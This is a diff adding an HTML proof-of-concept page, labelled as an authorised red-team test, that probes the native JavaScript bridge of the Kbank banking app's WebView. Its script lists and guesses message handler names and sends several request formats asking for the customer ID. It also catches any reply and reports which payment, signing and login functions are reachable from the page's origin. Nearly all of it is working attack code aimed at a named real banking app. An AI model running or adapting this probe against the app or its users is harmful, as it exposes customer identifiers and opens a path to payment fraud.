@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>REDTEAM PoC — Bridge Reachability (자사 앱 테스트 전용)</title>
+<style>
+  body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:16px;background:#0b0b0d;color:#e6e6e6}
+  h1{font-size:18px;color:#ff5c5c} .warn{background:#2a1a1a;border:1px solid #633;padding:10px;border-radius:8px;font-size:12px;margin:8px 0}
+  .ok{color:#4ade80} .bad{color:#ff6b6b} .muted{color:#888}
+  #log{white-space:pre-wrap;font:12px ui-monospace,Menlo,monospace;background:#141418;border-radius:8px;padding:12px;margin-top:12px}
+  code{color:#9ad}
+</style>
+</head>
+<body>
+<h1>⚠️ REDTEAM PoC — Bridge Reachability</h1>
+<div class="warn">
+  승인된 <b>자사 앱(케이뱅크) 테스트 전용</b>. 이 페이지는 <b>브릿지에 도달 가능한지와 데이터가 반환되는지</b>만 확인한다.
+  <b>실제 결제·서명은 실행하지 않는다</b>(민감 함수는 존재 여부만 열거). 외부 배포·실사용자 대상 사용 금지.
+</div>
+<div id="log"></div>
+
+<script>
+const origin = location.href;
+const L = (s, cls) => {
+  const d = document.getElementById('log');
+  d.innerHTML += (cls ? `<span class="${cls}">${s}</span>` : s) + "\n";
+};
+
+L("오리진(이 페이지 URL): " + origin, "muted");
+L("—".repeat(40));
+
+// 1) 노출된 메시지 핸들러(브릿지) 열거
+const mh = (window.webkit && window.webkit.messageHandlers) || {};
+let names = [];
+try { names = Object.keys(mh); } catch(e){}
+// WKScriptMessageHandler는 키 열거가 안 될 수 있어, 후보명으로도 존재 탐지
+const CANDIDATES = [
+  "callkbankgetsetting","callkbanksetsetting","kbank","nativeBridge","KbankBridge",
+  "smartbank","callLogin","JavaScriptService"
+];
+const present = new Set(names);
+CANDIDATES.forEach(n => { if (mh[n]) present.add(n); });
+
+L("노출된 브릿지 핸들러: " + (present.size ? [...present].join(", ") : "(열거 불가 — 아래 probe로 확인)"),
+  present.size ? "bad" : "muted");
+
+// 2) 읽기 브릿지 probe — custId/설정값이 JS로 반환되는지 (저위험, 데이터노출 판정)
+//    응답은 보통 네이티브가 window 콜백 함수를 호출해 돌려준다. 콜백 수신기를 깔아둔다.
+window.__redteam = {
+  onResult: (k, v) => L(`[응답] ${k} = ${String(v).slice(0,120)}` +
+                       (/custid|cust_id|member/i.test(k) ? "  ⚠️ 민감값 반환!" : ""),
+                       /custid|cust_id|member/i.test(k) ? "bad" : "ok")
+};
+
+function probeRead(handler){
+  try {
+    const h = mh[handler]; if(!h){ L(`[probe] ${handler}: 없음`, "muted"); return; }
+    // 다양한 메시지 포맷을 시도(핸들러 프로토콜 미상)
+    [ {method:"getsetting", key:"custid", callback:"__redteam.onResult"},
+      {cmd:"getSetting", param:"custid"},
+      "getsetting:custid" ].forEach(p => { try{ h.postMessage(p); }catch(e){} });
+    L(`[probe] ${handler}: 호출 전송됨 → 위 [응답] 로그 확인`, "ok");
+  } catch(e){ L(`[probe] ${handler}: 에러 ${e}`, "muted"); }
+}
+["callkbankgetsetting","kbank","nativeBridge","KbankBridge"].forEach(probeRead);
+
+// 3) 민감 함수 — 존재/도달 여부만 열거 (실행 안 함)
+L("—".repeat(40));
+L("민감 네이티브 함수 노출 점검 (※ 실제 호출 안 함):", "muted");
+["callZeroPay","callNonLoginPay","callMpkiSign","callCreateAutoLoginUuid","callLogin","callNativeLogin"]
+  .forEach(fn => {
+    // 브릿지가 단일 핸들러+method 디스패치면 핸들러 존재만으로 도달 가능
+    const reachable = present.size > 0;
+    L(`  ${fn}: ${reachable ? "도달 가능성 있음 ⚠️ (브릿지 노출됨)" : "미확인"}`,
+      reachable ? "bad" : "muted");
+  });
+
+L("—".repeat(40));
+L("판정 가이드:", "muted");
+L("• [응답]에 custId가 뜨면 → 오리진검증 없음 = #1 취약 확정", "muted");
+L("• 핸들러가 열거/도달되면 → 외부 오리진에서 브릿지 접근 가능", "muted");
+L("• 아무 것도 안 뜨면 → 브릿지 미노출 or 오리진 차단(방어 작동)", "muted");
+</script>
+</body>
+</html>
